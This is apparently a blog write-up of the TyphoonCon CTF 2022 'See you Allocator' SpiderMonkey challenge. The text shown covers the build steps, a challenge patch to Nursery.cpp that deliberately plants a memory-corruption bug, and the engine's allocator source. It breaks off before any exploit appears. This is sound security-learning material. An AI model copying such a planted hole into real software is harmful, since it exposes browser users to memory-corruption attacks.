<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>TyphoonCon CTF 2022 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:title" content="TyphoonCon CTF 2022" />
<meta property="og:description" content="Writeup for TyphoonCon CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/typhooncon-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-25T10:04:10+07:00" />
<meta property="article:modified_time" content="2022-06-25T10:04:10+07:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>

<meta name="twitter:title" content="TyphoonCon CTF 2022"/>
<meta name="twitter:description" content="Writeup for TyphoonCon CTF 2022 by Chovid99"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="twitter:creator" content="@Chovid99"/>
<meta property="og:site_name" content="Chovid99's Blog">

<meta name="generator" content="Hugo 0.105.0">


  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />


  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-19HP521HQ9');
  </script>



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">←</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">TyphoonCon CTF 2022</h1>

    <div class="tip">
        <time datetime="2022-06-25 10:04:10 &#43;0700 &#43;07">Jun 25, 2022</time>
        <span class="split">
          ·
        </span>
        <span>
          6388 words
        </span>
        <span class="split">
          ·
        </span>
        <span>
          30 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p><p class="markdown-image">
  <img src="https://i.imgur.com/sc5W1BV.png" alt=""  />
</p>
During the weekdays, I spent my after work time by working on the TyphoonCon CTF challenge, specifically See you Allocator challenge. This is my first time doing a browser pwn challenge, so I wrote this writeup for my future-self and as a training for me to understand it better. I apologize in advance if there is any mistake on my explanation, and feel free to correct me if i&rsquo;m wrong.</p>
<blockquote>
<p>Disclaimer, until now, I honestly don&rsquo;t know the intended solution that the authors want (because there are unintended solution which we can directly read the file with the js shell interpreter). But assuming this is like the normal browser pwn challenge, I set on my mind that the intended solution for this chall is to be able get RCE.</p>
</blockquote>
<h1 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h1>
<h2 id="see-you-allocator">See you Allocator <a href="#see-you-allocator" class="anchor">#</a></h2>
<p>On this challenge, we were given 2 info, the hash <code>commit</code> for the <a href="https://github.com/mozilla/gecko-dev/tree/c1598f6d3edad19ccc53f53ab045d1d29835e1dd" target="_blank" rel="noopener">firefox repo</a> and the challenge patch.</p>
<h3 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h3>
<p>This is my first time doing browser pwn, so maybe the best way for me is to setup the environment first.</p>
<h4 id="environment-setup">Environment Setup <a href="#environment-setup" class="anchor">#</a></h4>
<p>Reading through this <a href="https://vigneshsrao.github.io/posts/play-with-spidermonkey/" target="_blank" rel="noopener">article</a>, below is how we setup and build the js shell.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>git clone https://github.com/mozilla/gecko-dev.git
</span></span><span style="display:flex;"><span>cd gecko-dev
</span></span><span style="display:flex;"><span>git checkout c1598f6d3edad19ccc53f53ab045d1d29835e1dd
</span></span><span style="display:flex;"><span>git apply ../challenge.patch
</span></span><span style="display:flex;"><span>cp configure.in configure &amp;&amp; autoconf2.13
</span></span><span style="display:flex;"><span>mkdir build_NODBG.OBJ
</span></span><span style="display:flex;"><span>cd build_NODBG.OBJ
</span></span><span style="display:flex;"><span>../configure --disable-debug --disable-optimize
</span></span><span style="display:flex;"><span>make
</span></span></code></pre></td></tr></table>
</div>
</div><p>Usually for browser pwn challenge, AFAIK, one of the attack vector is usually the js shell (which is for Firefox, it is powered with SpiderMonkey engine). This will build a binary called <code>js</code> under the <code>dist/bin</code> folder. Notes that we build the non-debug js shell.</p>
<h4 id="analyzing-the-patch-and-source-code">Analyzing the patch and source code <a href="#analyzing-the-patch-and-source-code" class="anchor">#</a></h4>
<p>After successfully build the binary, not it&rsquo;s time for us to read the source code first. Let&rsquo;s start by reading the patchfile.</p>
<p><strong>challenge.patch</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>From 9b75f0de94978a681682cf13d392b0db7fa4161a Mon Sep 17 00:00:00 2001
</span></span><span style="display:flex;"><span>From: Your Name &lt;you@example.com&gt;
</span></span><span style="display:flex;"><span>Date: Thu, 17 Feb 2022 16:09:17 +0000
</span></span><span style="display:flex;"><span>Subject: [PATCH] Cool new Implementation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span> js/src/gc/Nursery.cpp | 4 +++-
</span></span><span style="display:flex;"><span> 1 file changed, 3 insertions(+), 1 deletion(-)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>diff --git a/js/src/gc/Nursery.cpp b/js/src/gc/Nursery.cpp
</span></span><span style="display:flex;"><span>index ef75e814ed..59ac8e5872 100644
</span></span><span style="display:flex;"><span>--- a/js/src/gc/Nursery.cpp
</span></span><span style="display:flex;"><span>+++ b/js/src/gc/Nursery.cpp
</span></span><span style="display:flex;"><span>@@ -701,12 +701,14 @@ void* js::Nursery::reallocateBuffer(Zone* zone, Cell* cell, void* oldBuffer,
</span></span><span style="display:flex;"><span>     return newBuffer;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>+  void* newBuffer = allocateBuffer(zone, newBytes);
</span></span><span style="display:flex;"><span>+
</span></span><span style="display:flex;"><span>   // The nursery cannot make use of the returned slots data.
</span></span><span style="display:flex;"><span>   if (newBytes &lt; oldBytes) {
</span></span><span style="display:flex;"><span>+    position_ -= oldBytes;
</span></span><span style="display:flex;"><span>     return oldBuffer;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>-  void* newBuffer = allocateBuffer(zone, newBytes);
</span></span><span style="display:flex;"><span>   if (newBuffer) {
</span></span><span style="display:flex;"><span>     PodCopy((uint8_t*)newBuffer, (uint8_t*)oldBuffer, oldBytes);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>-- 
</span></span><span style="display:flex;"><span>2.20.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the patch is applied to the Nursery.cpp file. To understand it better, let&rsquo;s try to read the method&rsquo;s code.</p>
<p><strong>Nursery.cpp</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> js<span style="color:#555">::</span>Nursery<span style="color:#555">::</span>reallocateBuffer(Zone<span style="color:#555">*</span> zone, Cell<span style="color:#555">*</span> cell, <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> oldBuffer,
</span></span><span style="display:flex;"><span>                                    size_t oldBytes, size_t newBytes) {
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span>IsInsideNursery(cell)) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> zone<span style="color:#555">-&gt;</span>pod_realloc<span style="color:#555">&lt;</span><span style="color:#078;font-weight:bold">uint8_t</span><span style="color:#555">&gt;</span>((<span style="color:#078;font-weight:bold">uint8_t</span><span style="color:#555">*</span>)oldBuffer, oldBytes, newBytes);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span>isInside(oldBuffer)) {
</span></span><span style="display:flex;"><span>    MOZ_ASSERT(mallocedBufferBytes <span style="color:#555">&gt;=</span> oldBytes);
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> newBuffer <span style="color:#555">=</span>
</span></span><span style="display:flex;"><span>        zone<span style="color:#555">-&gt;</span>pod_realloc<span style="color:#555">&lt;</span><span style="color:#078;font-weight:bold">uint8_t</span><span style="color:#555">&gt;</span>((<span style="color:#078;font-weight:bold">uint8_t</span><span style="color:#555">*</span>)oldBuffer, oldBytes, newBytes);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (newBuffer) {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (oldBuffer <span style="color:#555">!=</span> newBuffer) {
</span></span><span style="display:flex;"><span>        MOZ_ALWAYS_TRUE(
</span></span><span style="display:flex;"><span>            mallocedBuffers.rekeyAs(oldBuffer, newBuffer, newBuffer));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      mallocedBufferBytes <span style="color:#555">-=</span> oldBytes;
</span></span><span style="display:flex;"><span>      mallocedBufferBytes <span style="color:#555">+=</span> newBytes;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> newBuffer;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> newBuffer <span style="color:#555">=</span> allocateBuffer(zone, newBytes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#09f;font-style:italic">// The nursery cannot make use of the returned slots data.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#069;font-weight:bold">if</span> (newBytes <span style="color:#555">&lt;</span> oldBytes) {
</span></span><span style="display:flex;"><span>    position_ <span style="color:#555">-=</span> oldBytes;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> oldBuffer;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (newBuffer) {
</span></span><span style="display:flex;"><span>    PodCopy((<span style="color:#078;font-weight:bold">uint8_t</span><span style="color:#555">*</span>)newBuffer, (<span style="color:#078;font-weight:bold">uint8_t</span><span style="color:#555">*</span>)oldBuffer, oldBytes);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> newBuffer;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Because I didn&rsquo;t have context at all, let&rsquo;s try to read the <code>allocateBuffer</code> method first to gain some context.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> js<span style="color:#555">::</span>Nursery<span style="color:#555">::</span>allocateBuffer(Zone<span style="color:#555">*</span> zone, size_t nbytes) {
</span></span><span style="display:flex;"><span>  MOZ_ASSERT(nbytes <span style="color:#555">&gt;</span> <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (nbytes <span style="color:#555">&lt;=</span> MaxNurseryBufferSize) {
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> buffer <span style="color:#555">=</span> allocate(nbytes);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (buffer) {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span> buffer;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> buffer <span style="color:#555">=</span> zone<span style="color:#555">-&gt;</span>pod_malloc<span style="color:#555">&lt;</span><span style="color:#078;font-weight:bold">uint8_t</span><span style="color:#555">&gt;</span>(nbytes);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (buffer <span style="color:#555">&amp;&amp;</span> <span style="color:#555">!</span>registerMallocedBuffer(buffer, nbytes)) {
</span></span><span style="display:flex;"><span>    js_free(buffer);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#069;font-weight:bold">nullptr</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> buffer;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Assuming that our allocated size is less than <code>MaxNurseryBufferSize</code>, that means <code>allocateBuffer</code> will call <code>allocate</code> method. Let&rsquo;s check it out.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
